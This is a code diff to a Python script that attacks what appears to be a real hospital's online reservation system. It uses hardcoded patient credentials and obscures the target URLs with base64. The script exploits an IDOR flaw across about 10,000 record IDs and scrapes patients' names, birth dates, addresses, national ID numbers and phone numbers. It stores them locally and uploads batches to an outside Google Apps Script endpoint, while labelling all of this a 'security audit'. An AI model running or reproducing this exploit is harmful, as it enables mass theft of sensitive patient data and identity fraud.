@@ -3,6 +3,8 @@ from bs4 import BeautifulSoup
 import base64
 import os
 import sys
+import json
+import threading
 from concurrent.futures import ThreadPoolExecutor
 
 def clear():
@@ -29,13 +31,15 @@ def show_banner():
     print(f"\033[92m{banner}\033[0m")
 
 # Encrypted System Credentials
-NO_RM = _decode("MDA1MTA0ODE=")
-TGL_LAHIR = _decode("MTUwMTE5OTA=")
+NO_RM = _decode("MDA1MDk4NTY=")
+TGL_LAHIR = _decode("MzExMjE5NjA=")
 URL_HAL_LOGIN = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9hcHAvYXV0aC9sb2dpbg==")
 URL_ACTION_LOGIN = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9hcHAvYXV0aC9sb2dpbl9hY3Rpb24=")
 BASE_TARGET_URL = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9ob21lL3Jlc2VydmFzaV9kb2t0ZXIvdGFtYmFoLw==")
 
 session = requests.Session()
+lock = threading.Lock()
+hasil_data = []
 
 def login():
     print("[*] Initiating Security Audit: Captcha Bypass Testing...")
@@ -83,16 +87,66 @@ def fetch_data(id_num):
 
         # IDOR Testing: If nama_tag is found, it indicates a valid RM ID and data leakage
         print(f"[\033[92m+\033[0m] IDOR Success: Found Valid RM ID {formatted_id} for {nama_tag.get_text(strip=True)}")
+        nama = nama_tag.get_text(strip=True)
+        details = soup.find_all('p', class_='detail')
+        
+        data_pasien = {
+            "id": formatted_id,
+            "nama": nama,
+            "no_rm": "",
+            "tgl_lahir": "",
+            "alamat": "",
+            "nik": "",
+            "no_telp": ""
+        }
+
+        for p in details:
+            text = p.get_text(strip=True)
+            if "No. RM" in text: data_pasien["no_rm"] = text.split(":")[-1].strip()
+            elif "Tgl. Lahir" in text: data_pasien["tgl_lahir"] = text.split(":")[-1].strip()
+            elif "Alamat" in text: data_pasien["alamat"] = text.split(":")[-1].strip()
+            elif "NIK" in text: data_pasien["nik"] = text.split(":")[-1].strip()
+            elif "No. Telp" in text: data_pasien["no_telp"] = text.split(":")[-1].strip()
+
+        with lock:
+            hasil_data.append(data_pasien)
+            print(f"[\033[92m+\033[0m] IDOR Success: Found RM {formatted_id} - {nama}")
+            if len(hasil_data) % 10 == 0:
+                save_to_file()
+            if len(hasil_data) % 500 == 0:
+                upload_ke_sheets(hasil_data[-500:])
 
     except:
         print(f"[\033[91m!\033[0m] RM ID {formatted_id}: Not Found or Error Occurred.")
 
+def upload_ke_sheets(data_list):
+    url_web_app = "https://script.google.com/macros/s/AKfycbwuEBvR8i1u8SUmV-v2M8Mt6f3rtotVy9WBAUW5lsJ8xBFGZtEQ0VLl2QLtxt_tfhuK/exec"
+    payload = {"key": _decode("UE9OV0FHRUtMSVdPTkxFR0lQQUhJTkdNQVJV"), "target": "Reservasi", "data": data_list}
+    try: requests.post(url_web_app, json=payload)
+    except: pass
+
+def save_to_file():
+    file_name = 'reservasi_dokter.json'
+    if os.path.exists(file_name):
+        with open(file_name, 'r', encoding='utf-8') as f:
+            try: data_total = json.load(f)
+            except: data_total = []
+    else: data_total = []
+    existing_ids = {item['id'] for item in data_total}
+    for item in hasil_data:
+        if item['id'] not in existing_ids: data_total.append(item)
+    with open(file_name, 'w', encoding='utf-8') as f:
+        json.dump(data_total, f, indent=4, ensure_ascii=False)
+
 def start_process(start_range, end_range):
     if login():
         print(f"[*] Starting IDOR Scan for Doctor Reservations from range {start_range} to {end_range}...\n")
-        with ThreadPoolExecutor(max_workers=10) as executor: # Increased workers for faster scanning
+        with ThreadPoolExecutor(max_workers=5) as executor: # Adjusted to 5 for stability
             executor.map(fetch_data, range(start_range, end_range + 1))
         print("\n[*] IDOR Audit Completed for Doctor Reservations.")
+        save_to_file()
+        upload_ke_sheets(hasil_data)
+        print(f"\n[*] Audit Completed. Total leak found: {len(hasil_data)}")
 
 def main_menu():
     while True:
@@ -120,6 +174,8 @@ def main_menu():
         elif choice == '3':
             AWAL = int(_decode("NTAwMDAw"))
             AKHIR = int(_decode("NTEwNTAw"))
+            AWAL = 502013
+            AKHIR = 511858
             start_process(AWAL, AKHIR)
             input("\nTekan Enter untuk kembali ke menu...")
         elif choice == '0':
